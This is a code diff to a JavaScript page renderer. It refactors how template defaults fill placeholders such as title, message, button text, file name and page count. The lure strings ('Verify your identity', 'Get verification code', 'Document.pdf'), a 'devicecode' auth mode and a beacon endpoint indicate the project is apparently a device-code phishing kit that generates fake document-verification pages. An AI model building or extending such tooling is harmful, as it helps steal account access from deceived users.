@@ -85,6 +85,13 @@ function loadTemplateConfig(templateType) {
     return { name: templateType, preload: true, auth_mode: 'devicecode', fields: [] };
 }
 
+// Helper: Get default value for a field from template config
+function getConfigDefault(templateConfig, key, fallback) {
+    if (!templateConfig || !templateConfig.fields) return fallback;
+    var field = templateConfig.fields.find(function(f) { return f.key === key; });
+    return field && field.default !== undefined ? field.default : fallback;
+}
+
 function loadTemplateHTML(tt) {
     const fp = path.join(resolveTemplateDirectory(tt), 'index.html');
     return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
@@ -599,6 +606,9 @@ async function renderPageHtml(link, user, options) {
     const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
     const script = loadTemplateJS(templateType);
 
+    // Load template config early to get defaults for placeholders
+    const templateConfig = loadTemplateConfig(templateType);
+
     // Check if this is a slider HTML design
     const sliderData = loadVerificationDesignHTML(designName);
     const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
@@ -610,11 +620,12 @@ async function renderPageHtml(link, user, options) {
         html = html.replace('// {{SCRIPT}}', '<script>' + script + '</script>');
     }
 
-    html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
-    html = html.replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue');
-    html = html.replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code');
-    html = html.replace('{{FILE_NAME}}', link.file_name || 'Document.pdf');
-    html = html.replace('{{PAGES}}', String(link.pages || 1));
+    // Use template config defaults as fallbacks, then link overrides
+    html = html.replace('{{TITLE}}', link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity'));
+    html = html.replace('{{MESSAGE}}', link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue'));
+    html = html.replace('{{BUTTON_TEXT}}', link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code'));
+    html = html.replace('{{FILE_NAME}}', link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf'));
+    html = html.replace('{{PAGES}}', String(link.pages || getConfigDefault(templateConfig, 'pages', 1)));
 
     const verifyUrl = (options.apiBaseUrl || config.APP_URL || '').trim().replace(/\/+$/, '');
     const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
@@ -645,7 +656,6 @@ async function renderPageHtml(link, user, options) {
         html = html.replace('</head>', '<script>' + vgEngine + '</script></head>');
     }
 
-    const templateConfig = loadTemplateConfig(templateType);
     if (templateConfig.preload) {
         html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
         html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
